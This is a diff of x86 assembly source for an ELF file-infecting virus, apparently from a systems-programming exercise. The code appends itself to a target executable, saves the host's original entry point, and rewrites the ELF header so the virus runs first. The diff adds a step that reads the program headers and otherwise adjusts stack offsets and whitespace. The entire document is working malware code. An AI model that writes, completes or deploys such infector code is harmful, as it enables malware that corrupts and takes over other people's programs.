@@ -67,7 +67,7 @@ anchor:
 _start:
     push	ebp
     mov		ebp, esp
-    sub		esp, STK_RES             ; Set up ebp and reserve space on the stack for local storage
+    sub		esp, STK_RES               ; Set up ebp and reserve space on the stack for local storage
 
 print_msg:
     call 	get_my_loc
@@ -106,8 +106,8 @@ check_elf:
 
 infect_file:
     lseek	[ebp - 8], 0, SEEK_END
-	cmp		eax, 0
-	jl		FailExit
+    cmp		eax, 0
+    jl		FailExit
     mov		[ebp - 12], eax
     call	get_my_loc
     add		dword [ebp - 4], (virus_start - anchor)
@@ -117,10 +117,10 @@ infect_file:
 
 load_Ehdr:
     lseek	[ebp - 8], 0, SEEK_SET
-	cmp		eax, 0
-	jl		FailExit
+    cmp		eax, 0
+    jl		FailExit
     mov		eax, ebp
-    sub		eax, (12 + EHDR_size)
+    sub		eax, (16 + EHDR_size)
     read	[ebp - 8], eax, EHDR_size
     cmp		eax, 0
     jle		FailExit
@@ -129,28 +129,45 @@ save_prev_entry:
     lseek   [ebp - 8], -4, SEEK_END
     cmp     eax, 0
     jl      FailExit
-    mov		eax, ebp                 ; get a pointer to the header
-    sub		eax, ((12 + EHDR_size) - ENTRY)
+    mov		eax, ebp                   ; get a pointer to the header
+    sub		eax, ((16 + EHDR_size) - ENTRY)
     write   [ebp - 8], eax, 4
     cmp		eax, 0
     jle		FailExit
 
+load_PHDR:
+    .get_offset:
+    mov     eax, ebp                ; get the ptr to the phdr offset
+    sub     eax, ((16 + EHDR_size) - PHDR_start)
+    mov     ecx, [eax]              ; save the offset on the stack
+    mov     [ebp - 16], ecx
+
+    .read_PHDR:
+    lseek   [ebp - 8], [ebp - 16], SEEK_SET
+    cmp		eax, 0
+    jl		FailExit
+    mov     eax, ebp
+    sub     eax, (16 + EHDR_size + PHDR_size*2)
+    read    [ebp - 8], eax, PHDR_size*2
+    cmp		eax, 0
+    jle		FailExit
+
 modify_entry:
-    mov		eax, ebp                 ; get a pointer to the header
-    sub		eax, (12 + EHDR_size)
-    mov		ecx, [ebp - 12]          ; get the adress to write into ecx
+    mov		eax, ebp                   ; get a pointer to the header
+    sub		eax, (16 + EHDR_size)
+    mov		ecx, [ebp - 12]            ; get the adress to write into ecx
     add		ecx, (FILE_START_ADDR + (_start - virus_start))
-    mov		dword [eax + ENTRY], ecx ; write the adress into the header
+    mov		dword [eax + ENTRY], ecx   ; write the adress into the header
 
 overload_Ehdr:
     lseek	[ebp - 8], 0, SEEK_SET
-	cmp		eax, 0
-	jl		FailExit
+    cmp		eax, 0
+    jl		FailExit
     mov		eax, ebp
-    sub		eax, (12 + EHDR_size)
+    sub		eax, (16 + EHDR_size)
     write	[ebp - 8], eax, EHDR_size
-	cmp		eax, 0
-	jle		FailExit
+    cmp		eax, 0
+    jle		FailExit
 
 close_file:
     close 	[ebp - 8]
@@ -164,8 +181,8 @@ run_program:
     jmp    [eax]
 
 VirusExit:
-    exit 0                        ; Termination if all is OK and no previous code to jump to
-                                  ; (also an example for use of above macros)
+    exit 0                          ; Termination if all is OK and no previous code to jump to
+                                    ; (also an example for use of above macros)
 FailExit:
     mov     [ebp - 8], eax
     call	get_my_loc
